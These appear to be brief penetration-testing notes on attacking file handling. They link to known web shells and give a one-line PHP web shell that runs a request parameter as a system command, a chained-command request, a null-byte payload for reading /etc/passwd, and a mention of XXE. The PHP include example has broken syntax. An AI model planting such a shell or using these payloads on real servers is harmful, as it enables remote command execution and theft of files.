# Notes on file handling

## Web shells

- [p0wny-shell](https://github.com/flozz/p0wny-shell)
- [b374k-shell](https://github.com/b374k/b374k)
- [c99-shell](https://www.r57shell.net/single.php?id=13)
- [r57shell](https://www.r57shell.net/index.php)

Managing to upload the following .php file to a web server with a file upload vulnerability results in RCE if the webserver can run php. The code takes a GET parameter and executes it as a system command. It then echoes the output out to the screen.

```php
<?php
    echo system($_GET["cmd"]);
?>
```

The server executes the command set in the cmd request parameter:

`http://vulnerable.site/uploads?webshell.php?cmd=id;whoami;ls`

The Kali webshells are located in */usr/share/webshells*

## Null termination bugs

When testing file handling vulns on php (example):

```
<?php
include($GET['page'] . ['.php']);
?>
```

Try to include null character %00 or \x00 to exclude the file extension. This may allow reading arbitrary files like this:

?page=/etc/passwd%00

---

## XXE

When a file gets uploaded to some server, chances are there is XML in it. This opens the possibility for XXE attacks.

---